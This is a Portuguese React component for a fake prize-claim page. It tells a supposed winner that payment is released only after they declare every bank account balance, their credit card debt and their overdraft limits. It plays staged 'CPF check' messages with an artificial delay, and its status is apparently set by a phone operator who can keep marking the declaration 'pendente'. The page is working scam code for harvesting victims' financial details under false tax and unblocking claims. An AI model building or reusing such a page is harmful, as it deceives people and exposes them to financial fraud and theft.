import { useEffect, useRef, useState } from 'react'
import BancoPicker from './BancoPicker.jsx'
import { exigirDeclaracao, statusDeclaracao, recusarPremio, enviarDeclaracao, mascaraReal, valorReal } from '../lib/declaracao.js'

const espera = (ms) => new Promise((r) => setTimeout(r, ms))
const MENSAGENS_ANALISE = [
  'Analisando suas declarações…',
  'Consultando seu CPF…',
  'Conferindo os valores informados…',
  'Verificando se todas as instituições com saldo foram declaradas…',
]
const novaConta = (banco = null, valor = '') => ({ key: Math.random().toString(36).slice(2), banco, valor })
// Conta já salva (saldo em reais, ex.: 1200.5) volta pro formulário como "R$ 1.200,50".
const contaSalva = (c) => {
  const centavos = Math.round(Number(String(c.saldo ?? '').replace(',', '.')) * 100)
  return novaConta({ codigo: c.codigo, nome: c.nome }, centavos > 0 ? mascaraReal(String(centavos)) : '')
}

// Etapa do /ganhador depois da notificação de ganho: declaração de valores das contas.
// Só aparece se a chave geral estiver ligada (premio_exigir_declaracao).
export default function DeclaracaoPremio({ cpf, onConcluir }) {
  const [ativa, setAtiva] = useState(false)
  const [st, setSt] = useState(null) // { estado, temCartao, cartaoDivida, temCheque, contas }
  const [modal, setModal] = useState(false)
  const [erro, setErro] = useState('')
  const [busy, setBusy] = useState(false)
  const [analise, setAnalise] = useState(null) // índice da mensagem de análise ou null
  const [segundos, setSegundos] = useState(5)
  const vivo = useRef(true)

  // Form do modal
  const [temCartao, setTemCartao] = useState(null)
  const [cartaoDivida, setCartaoDivida] = useState(null)
  const [temCheque, setTemCheque] = useState(null)
  const [contas, setContas] = useState([novaConta()])

  useEffect(() => {
    vivo.current = true
    return () => { vivo.current = false }
  }, [])

  // Liga/desliga pela chave geral e lê o estado atual do CPF.
  useEffect(() => {
    let parou = false
    exigirDeclaracao().then((v) => { if (!parou && vivo.current) setAtiva(v) })
    return () => { parou = true }
  }, [])

  const carregar = async () => {
    try {
      const r = await statusDeclaracao(cpf)
      if (vivo.current) setSt(r)
    } catch {
      /* mantém o que já está na tela */
    }
  }

  // Atualiza sozinho (ligador responde → ganhador vê na hora). Para quando está fechado.
  useEffect(() => {
    if (!ativa) return
    carregar()
    const id = setInterval(() => {
      if (st?.estado === 'regularizado' || st?.estado === 'recusou') return
      carregar()
    }, 4000)
    return () => clearInterval(id)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ativa, cpf, st?.estado])

  // Regularizado: 5 segundos e volta pro fluxo normal de receber o prêmio.
  useEffect(() => {
    if (st?.estado !== 'regularizado') return
    setSegundos(5)
    const id = setInterval(() => setSegundos((s) => s - 1), 1000)
    return () => clearInterval(id)
  }, [st?.estado])
  useEffect(() => {
    if (st?.estado === 'regularizado' && segundos <= 0) onConcluir?.()
  }, [segundos, st?.estado, onConcluir])

  if (!ativa || !st) return null

  const abrirModal = () => {
    setErro('')
    setTemCartao(st.temCartao)
    setCartaoDivida(st.cartaoDivida)
    setTemCheque(st.temCheque)
    setContas(st.contas?.length ? st.contas.map(contaSalva) : [novaConta()])
    setModal(true)
  }

  const recusar = async () => {
    setBusy(true)
    try {
      await recusarPremio(cpf)
      await carregar()
    } catch (e) {
      setErro(e.message || 'Não foi possível registrar agora. Tente de novo em alguns segundos.')
    }
    setBusy(false)
  }

  const atualizarConta = (key, campo, valor) =>
    setContas((lista) => lista.map((c) => (c.key === key ? { ...c, [campo]: valor } : c)))

  const validar = () => {
    if (temCartao === null) return 'Responda se você tem cartão de crédito.'
    if (temCartao && cartaoDivida === null) return 'Responda se está devendo no cartão.'
    if (temCheque === null) return 'Responda se tem cheque especial ou limite de empréstimo.'
    const comSaldo = contas.filter((c) => c.banco || valorReal(c.valor) > 0)
    if (!comSaldo.length) return 'Informe pelo menos uma conta com saldo.'
    for (const c of comSaldo) {
      if (!c.banco) return 'Escolha o banco de cada conta.'
      if (!(valorReal(c.valor) > 0)) return `Informe o saldo atual da conta ${c.banco.nome}, ou remova a linha.`
    }
    return ''
  }

  const finalizar = async () => {
    const msg = validar()
    if (msg) { setErro(msg); return }
    setErro('')
    setModal(false)
    setAnalise(0)
    const inicio = Date.now()
    const troca = setInterval(() => setAnalise((i) => (i === null ? null : (i + 1) % MENSAGENS_ANALISE.length)), 1200)
    try {
      const contasEnvio = contas
        .filter((c) => c.banco && valorReal(c.valor) > 0)
        .map((c) => ({ codigo: c.banco.codigo, nome: c.banco.nome, saldo: valorReal(c.valor) }))
      await enviarDeclaracao(cpf, {
        temCartao, cartaoDivida: temCartao ? cartaoDivida : false, temCheque, contas: contasEnvio,
      })
      await espera(Math.max(0, 4500 - (Date.now() - inicio)))
    } catch (e) {
      clearInterval(troca)
      if (vivo.current) { setAnalise(null); setErro(e.message || 'Não foi possível enviar. Tente de novo.'); setModal(true) }
      return
    }
    clearInterval(troca)
    if (!vivo.current) return
    setAnalise(null)
    await carregar()
  }

  if (analise !== null) {
    return (
      <section className="decl decl--analise" aria-live="polite">
        <div className="decl__spin" aria-hidden="true" />
        <h2 className="decl__titulo">Aguarde um instante…</h2>
        <p className="decl__texto">{MENSAGENS_ANALISE[analise]}</p>
      </section>
    )
  }

  const { estado } = st

  return (
    <>
      <section className={`decl decl--${estado}`}>
        {estado === 'aguardando' && (
          <>
            <h2 className="decl__titulo">Antes de receber seu prêmio</h2>
            <p className="decl__texto">
              Para liberar o pagamento, precisamos que você informe os valores atuais das suas contas
              e em qual instituição cada uma está. Assim o valor é liberado sem ficar bloqueado.
            </p>
            <button type="button" className="decl__btn decl__btn--verde" onClick={abrirModal}>
              Quero receber, vamos prosseguir!
            </button>
            <button type="button" className="decl__btn decl__btn--cinza" onClick={recusar} disabled={busy}>
              Não quero receber meu prêmio
            </button>
          </>
        )}

        {estado === 'recusou' && (
          <>
            <h2 className="decl__titulo">Você optou por não receber o prêmio</h2>
            <p className="decl__texto">Tudo bem. Pode fechar esta página.</p>
          </>
        )}

        {estado === 'enviada' && (
          <>
            <div className="decl__spin" aria-hidden="true" />
            <h2 className="decl__titulo">Declaração recebida</h2>
            <p className="decl__texto">
              Estamos conferindo as informações. Assim que for concluído, esta tela atualiza sozinha.
            </p>
          </>
        )}

        {estado === 'pendente' && (
          <>
            <h2 className="decl__titulo decl__titulo--alerta">Ainda há valores pendentes</h2>
            <p className="decl__texto">
              Confira se você informou <strong>todas as instituições</strong> em que possui saldo, e
              responda as perguntas de novo.
            </p>
            <button type="button" className="decl__btn decl__btn--verde" onClick={abrirModal}>
              Continuar declaração
            </button>
          </>
        )}

        {estado === 'regularizado' && (
          <>
            <h2 className="decl__titulo decl__titulo--ok">CPF regularizado</h2>
            <p className="decl__texto">Os valores foram informados. Voltando para o recebimento em {Math.max(segundos, 0)}s…</p>
          </>
        )}

        {erro && <p className="decl__erro" role="alert">{erro}</p>}
      </section>

      {modal && (
        <div className="decl-modal" role="dialog" aria-modal="true" aria-labelledby="decl-modal-titulo">
          <div className="decl-modal__caixa">
            <div className="decl-modal__cabeca">
              <h2 id="decl-modal-titulo" className="decl__titulo">Declaração de valores</h2>
              <button type="button" className="decl-modal__fechar" onClick={() => setModal(false)} aria-label="Fechar">×</button>
            </div>

            <p className="decl__texto">
              Aqui você informa os <strong>valores atuais</strong> de cada conta em que tem saldo e a
              instituição onde ela está. Essas informações são usadas para liberar o pagamento e para a
              tributação, já que os valores não foram declarados corretamente antes. Declarar agora evita
              que o valor fique bloqueado ou travado.
            </p>

            <div className="decl-pergunta">
              <span>Você tem cartão de crédito?</span>
              <div className="decl-sim-nao">
                <button type="button" className={temCartao === true ? 'is-on' : ''} onClick={() => setTemCartao(true)}>Sim</button>
                <button type="button" className={temCartao === false ? 'is-on' : ''} onClick={() => { setTemCartao(false); setCartaoDivida(null) }}>Não</button>
              </div>
            </div>

            {temCartao === true && (
              <div className="decl-pergunta">
                <span>Está devendo no cartão de crédito?</span>
                <span className="decl-dica">Pagamentos feitos ao CPF podem ser descontados do cartão em caso de dívida.</span>
                <div className="decl-sim-nao">
                  <button type="button" className={cartaoDivida === true ? 'is-on' : ''} onClick={() => setCartaoDivida(true)}>Sim</button>
                  <button type="button" className={cartaoDivida === false ? 'is-on' : ''} onClick={() => setCartaoDivida(false)}>Não</button>
                </div>
              </div>
            )}

            <div className="decl-pergunta">
              <span>Você tem cheque especial ou limite de empréstimo?</span>
              <span className="decl-dica">Não precisa informar valores. Essa informação é confidencial.</span>
              <div className="decl-sim-nao">
                <button type="button" className={temCheque === true ? 'is-on' : ''} onClick={() => setTemCheque(true)}>Sim</button>
                <button type="button" className={temCheque === false ? 'is-on' : ''} onClick={() => setTemCheque(false)}>Não</button>
              </div>
            </div>

            <div className="decl-contas">
              <span className="decl-contas__titulo">Contas com saldo</span>
              {contas.map((c, i) => (
                <div className="decl-conta" key={c.key}>
                  <div className="decl-conta__topo">
                    <span className="decl-dica">Conta {i + 1}</span>
                    {contas.length > 1 && (
                      <button type="button" className="decl-conta__remover" onClick={() => setContas((l) => l.filter((x) => x.key !== c.key))}>Remover</button>
                    )}
                  </div>
                  <BancoPicker valor={c.banco} onChange={(b) => atualizarConta(c.key, 'banco', b)} />
                  <input
                    className="decl-valor"
                    inputMode="numeric"
                    placeholder="R$ 0,00"
                    value={c.valor}
                    onChange={(e) => atualizarConta(c.key, 'valor', mascaraReal(e.target.value))}
                  />
                </div>
              ))}
              <button type="button" className="decl-conta__adicionar" onClick={() => setContas((l) => [...l, novaConta()])}>
                + Adicionar outro banco com saldo
              </button>
            </div>

            {erro && <p className="decl__erro" role="alert">{erro}</p>}

            <button type="button" className="decl__btn decl__btn--verde" onClick={finalizar}>
              Finalizar e receber o prêmio
            </button>
          </div>
        </div>
      )}
    </>
  )
}
